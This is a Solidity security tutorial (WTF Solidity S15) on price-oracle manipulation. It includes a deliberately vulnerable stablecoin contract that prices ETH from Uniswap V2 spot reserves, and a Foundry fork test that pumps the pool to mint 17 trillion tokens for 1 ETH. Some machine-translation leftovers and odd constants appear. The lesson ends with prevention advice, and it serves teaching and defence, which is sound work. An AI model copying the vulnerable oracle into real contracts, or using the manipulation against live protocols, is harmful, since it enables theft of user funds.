
title: S15. Manipulating Oracle
tags:
- solidity
- security
- oracle

---

# WTF Solidity Contract Security: S15. Manipulating Oracles

Recently I am relearning solidity to consolidate my knowledge of the details. I am also writing a "WTF Solidity Beginner's Guide" for beginners to use (programming experts can find other tutorials). I will update 1-3 lectures every week.

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy_](https://twitter.com/WTFAcademy_)

(This is already in English, as it is the Twitter handle of two accounts)

Community: [Discord](https://discord.wtf.academy) ｜ [WeChat group](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link) ｜ [Official website wtf.academy](https://wtf.academy)

"All code and tutorials are open source on GitHub: [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTFSolidity)"

-----

In this lecture, we'll introduce the manipulation of smart contract oracle attacks and reproduce an attack example: exchanging 1 ETH for 17 trillion stablecoins. Only in 2022, such attacks caused users to lose more than $200 million in assets.

## Price oracle

For safety considerations, the Ethereum Virtual Machine (EVM) is a closed and isolated sandbox. Smart contracts running on the EVM can access on-chain information, but cannot actively communicate with the outside world to obtain off-chain information. However, such information is crucial for decentralized applications.

"An oracle can help us solve this problem by obtaining information from off-chain data sources and adding it to the blockchain for use by smart contracts."

"The most commonly used one is the price oracle, which can refer to any data source that allows you to query currency prices. Typical use cases include:
- Decentralized lending platforms (AAVE) use it to determine whether the borrower has reached the liquidation threshold.
- Synthetic asset platforms (Synthetix) use it to determine the latest asset prices and support 0 slippage trading.
- MakerDAO uses it to determine the price of collateral and mint corresponding stablecoin $DAI."

![](./img/S15-1.png)

## Oracle Vulnerability

If the prophecy machine is not used correctly by the developer, it will cause huge security risks.

- In October 2021, Cream Finance, a DeFi platform on the BNB chain, lost $130 million of user funds due to a oracle vulnerability (https://rekt.news/cream-rekt-2/).

- In May 2022, Mirror Protocol, a synthetic asset platform on the Terra chain, lost $115 million of user funds due to an oracle vulnerability (https://rekt.news/mirror-rekt/).

- In October 2022, Mango Market, a decentralized lending platform on the Solana chain, lost $115 million of user funds due to an oracle vulnerability (https://rekt.news/mango-markets-rekt/).

## Vulnerability Example

Below we will study an example of an oracle vulnerability, the `oUSD` contract. This contract is a stablecoin contract that complies with the ERC20 standard. Similar to the synthetic asset platform Synthetix, users can exchange `ETH` for `oUSD` with zero slippage in this contract. The exchange price is determined by a custom price oracle (`getPrice()` function), and the instant price of Uniswap V2's `WETH-BUSD` is used here. In the following attack example, we will see that this oracle is very easy to manipulate.

### Vulnerable Contract

"oUSD contract includes 7 state variables to record the addresses of BUSD, WETH, UniswapV2 factory contract, and WETH-BUSD pair contract."

The `oUSD` contract mainly includes 3 functions:

- Constructor: initializes the `ERC20` token's name and symbol.
- `getPrice()`: price oracle, retrieves the instantaneous price of `WETH-BUSD` on Uniswap V2, which is where the vulnerability lies.

  ```
    // 获取ETH price
    function getPrice() public view returns (uint256 price) {
        // pair 交易对中储备
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // ETH 瞬时价格
        price = reserve0/reserve1;
    }
  ```

- `swap()`: Exchange function that converts `ETH` into `oUSD` at the price provided by the oracle.

Contract Code:

```solidity
contract oUSD is ERC20{
    // 主网合约
    address public constant FACTORY_V2 =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;

    IUniswapV2Factory public factory = IUniswapV2Factory(FACTORY_V2);
    IUniswapV2Pair public pair = IUniswapV2Pair(factory.getPair(WETH, BUSD));
    IERC20 public weth = IERC20(WETH);
    IERC20 public busd = IERC20(BUSD);

    constructor() ERC20("Oracle USD","oUSD"){}

    // 获取ETH price
    function getPrice() public view returns (uint256 price) {
        // pair 交易对中储备
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // ETH 瞬时价格
        price = reserve0/reserve1;
    }

    function swap() external payable returns (uint256 amount){
        // 获取价格
        uint price = getPrice();
        // 计算兑换数量
        amount = price * msg.value;
        // 铸造代币
        _mint(msg.sender, amount);
    }
}
```

### Attack Strategy

"We attacked the vulnerable `getPrice()` function of a pricing oracle. Steps:"

1. Prepare some `BUSD`, which can be self-owned funds or borrowed from flash loans. In the implementation, we use Foundry's `deal` cheatcode to mint ourselves `1_000_000 BUSD` on the local network.
2. Buy a large amount of `WETH` in the `WETH-BUSD` pool on UniswapV2. See `swapBUSDtoWETH()` function in the attack code for specific implementation details.
3. When the instantaneous price of `WETH` skyrockets, we call the `swap()` function to convert `ETH` into `oUSD`.
4. **Optional:** Sell the `WETH` purchased in step 2 in the `WETH-BUSD` pool to recover the principal.

"These 4 steps can be completed in one transaction."

### Foundry Replication

"We used Foundry to reproduce the manipulation of the oracle attack because it is fast and can create local forks of the mainnet for easy testing. If you are not familiar with Foundry, you can read [WTF Solidity Tool Series T07: Foundry](https://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md)."

1. After installing Foundry, enter the following command in the command line to start a new project and install the openzeppelin library.

  ```shell
  forge init Oracle
  cd Oracle
  forge install Openzeppelin/openzeppelin-contracts
  ```

2. Create an `.env` environment variable file under the root directory, and add the mainnet RPC to it for creating a local test network.

  ```
  MAINNET_RPC_URL= https://rpc.ankr.com/eth
  ```

Translate: 

3. Copy the code for this lecture, `Oracle.sol` and `Oracle.t.sol`, to the `src` and `test` folders in the root directory respectively, then use the following command to start the attack script.

  ```
  forge test -vv --match-test testOracleAttack
  ```

4. We can see the attack results in the terminal. Before the attack, the oracle `getPrice()` gave a normal price of `1216 USD` for Ethereum. However, after buying `WETH` with `1,000,000` BUSD in the UniswapV2 `WETH-BUSD` pool, the oracle's reported price was manipulated to be `17,979,841,782,699 USD`. At this point, we were able to easily exchange `1 ETH` for 17 trillion `oUSD` and complete the attack.

  ```shell
  Running 1 test for test/Oracle.t.sol:OracleTest
  [PASS] testOracleAttack() (gas: 356524)
  Logs:
    1. ETH Price (before attack): 1216
    2. Swap 1,000,000 BUSD to WETH to manipulate the oracle
    3. ETH price (after attack): 17979841782699
    4. Minted 1797984178269 oUSD with 1 ETH (after attack)

  Test result: ok. 1 passed; 0 failed; finished in 262.94ms
  ```

"攻击代码：" translates to "Attack code:".

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Oracle.sol";

contract OracleTest is Test {
    address private constant alice = address(1);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router router;
    IWETH private weth = IWETH(WETH);
    IBUSD private busd = IBUSD(BUSD);
    string MAINNET_RPC_URL;
    oUSD ousd;

    function setUp() public {
        MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        // fork指定区块
        vm.createSelectFork(MAINNET_RPC_URL,16060405);
        router = IUniswapV2Router(ROUTER);
        ousd = new oUSD();
    }

    //forge test --match-test  testOracleAttack  -vv
    function testOracleAttack() public {
        // 攻击预言机
        // 0. 操纵预言机之前的价格
        uint256 priceBefore = ousd.getPrice();
        console.log("1. ETH Price (before attack): %s", priceBefore); 
        // 给自己账户 1000000 BUSD
        uint busdAmount = 1_000_000 * 10e18;
        deal(BUSD, alice, busdAmount);
        // 2. 用busd买weth，推高顺时价格
        vm.prank(alice);
        busd.transfer(address(this), busdAmount);
        swapBUSDtoWETH(busdAmount, 1);
        console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
        // 3. 操纵预言机之后的价格
        uint256 priceAfter = ousd.getPrice();
        console.log("3. ETH price (after attack): %s", priceAfter); 
        // 4. 铸造oUSD
        ousd.swap{value: 1 ether}();
        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18); 
    }

    // Swap BUSD to WETH
    function swapBUSDtoWETH(uint amountIn, uint amountOutMin)
        public
        returns (uint amountOut)
    {   
        busd.approve(address(router), amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = BUSD;
        path[1] = WETH;

        uint[] memory amounts = router.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            alice,
            block.timestamp
        );

        // amounts[0] = BUSD amount, amounts[1] = WETH amount
        return amounts[1];
    }
}
```

## Prevention methods

"Famous blockchain security expert `samczsun` summarized the prevention methods of oracle manipulation in a [blog](https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle). We summarize them here:"

1. Do not use pools with poor liquidity as price oracles.
2. Do not use spot/instant prices as price oracles. Use price delays such as Time-Weighted Average Prices (TWAP).
3. Use decentralized price oracles.
4. Use multiple data sources and choose a few closest to the median price each time as price oracles to avoid extreme situations.
5. Carefully read the usage instructions and parameter settings of third-party price oracles.

## Summary

In this lecture, we introduced manipulating oracle attacks and successfully attacked a vulnerable synthetic stablecoin contract, using `1 ETH` to exchange for 17 trillion stablecoins, making us the world's richest person (which is not true).